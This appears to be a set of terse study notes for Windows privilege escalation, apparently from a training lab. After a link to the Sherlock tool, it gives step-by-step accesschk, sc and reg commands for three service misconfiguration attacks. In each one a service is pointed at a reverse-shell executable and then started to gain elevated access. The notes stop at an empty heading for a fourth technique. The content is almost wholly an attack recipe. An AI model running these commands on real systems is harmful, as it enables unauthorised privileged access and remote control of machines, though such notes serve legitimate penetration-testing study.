##SHERLOCK => https://github.com/sherlock-project/sherlock

##Service Exploits - Insecure Service Permissions
1) Use accesschk.exe to check the "user" account's permissions on the "daclsvc" service: C:\PrivEsc\accesschk.exe /accepteula -uwcqv user daclsvc    
2) Query the service for getting service privileges: sc qc daclsvc    
3) Modify the service config and set the BINARY_PATH_NAME (binpath) to the reverse.exe: sc config daclsvc binpath= "\"C:\PrivEsc\reverse.exe\""    
4) Setup local listener and run service: net start daclsvc    

##Service Exploits - Unquoted Service Path
1) Define services and run sc qc [service name], fuul ninary path C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe    
2) Using accesschk.exe for access rights: C:\PrivEsc\accesschk.exe /accepteula -uwdq "C:\Program Files\Unquoted Path Service\"    
3) Copy the reverse.exe executable to this directory and rename it Common.exe: copy C:\PrivEsc\reverse.exe "C:\Program Files\Unquoted Path Service\Common.exe"    
4) Start listener and run service: net start unquotedsvc    

##Service Exploits - Weak Registry Permissions
1) Query register service: sc qc regsvc    
2) Using accesschk.exe: C:\PrivEsc\accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\regsvc    
3) Overwrite registry key: reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d C:\PrivEsc\reverse.exe /f    
4) Start listener and run service: net start regsvc    

##Service Exploits - Insecure Service Executables
